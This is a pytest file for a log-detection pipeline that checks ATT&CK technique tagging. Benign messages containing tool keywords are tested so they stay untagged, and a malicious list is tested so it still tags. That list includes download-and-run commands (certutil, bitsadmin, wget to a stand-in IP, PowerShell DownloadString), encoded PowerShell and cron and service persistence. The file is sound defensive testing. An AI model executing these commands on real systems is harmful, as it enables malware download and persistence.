"""ITEM-15: substring keyword rules must not fire on benign text that merely contains a keyword,
while the real malicious forms of the same tools still tag."""
import pytest

from conftest import SAMPLES  # noqa: F401  (sets sys.path to src)
from bastion.models import Event
from bastion.pipeline import map_attack


def _attack(category, message, action="x", process=None):
    e = Event(ts="2026-10-03T22:00:00Z", source="s", category=category, action=action,
              message=message, process=process)
    map_attack([e])
    return set(e.attack)


BENIGN = [
    ("process", "new service registered with consul", "T1543"),
    ("process", "systemctl enable nginx", "T1543"),
    ("process", "useradd: group 'x' exists", "T1136"),
    ("process", "wget  is not installed", "T1105"),
    ("process", "the curl  library updated", "T1105"),
    ("process", "bitsadmin /list", "T1105"),
    ("process", "certutil -hashfile a.txt SHA256", "T1105"),
    ("network", "file upload completed 12KB to s3 bucket by backup job", "T1048"),
    ("process", "crontab -l", "T1053"),
    ("process", "rdpclip.exe started", "T1021"),
    ("process", "powershell Get-Content a.txt -Encoding utf8 | index", "T1059.001"),
]

MALICIOUS = [
    ("process", "crontab -e added '* * * * * /tmp/.x' job", "T1053"),
    ("process", "crontab /tmp/.x.cron installed for root", "T1053"),
    ("process", "systemctl enable /tmp/.x/updater.service", "T1543"),
    ("process", "new service updater.service via systemctl enable", "T1543"),
    ("process", "new service installed: evilsvc", "T1543"),
    ("process", "sc create evilsvc binPath= C:\\\\x.exe", "T1543"),
    ("process", "powershell -EncodedCommand SQBFAFgA", "T1059.001"),
    ("process", "powershell -enc AAAA", "T1059.001"),
    ("process", "powershell iex (New-Object Net.WebClient).DownloadString('http://x')", "T1059.001"),
    ("process", "certutil -urlcache -f http://203.0.113.90/tool.exe C:\\Windows\\Temp\\tool.exe", "T1105"),
    ("process", "bitsadmin /transfer job http://203.0.113.90/t.exe C:\\t.exe", "T1105"),
    ("process", "wget -O /tmp/x http://203.0.113.90/x", "T1105"),
]


@pytest.mark.parametrize("cat,msg,tid", BENIGN)
def test_benign_text_is_not_tagged(cat, msg, tid):
    assert tid not in _attack(cat, msg)


@pytest.mark.parametrize("cat,msg,tid", MALICIOUS)
def test_malicious_forms_still_tag(cat, msg, tid):
    assert tid in _attack(cat, msg)
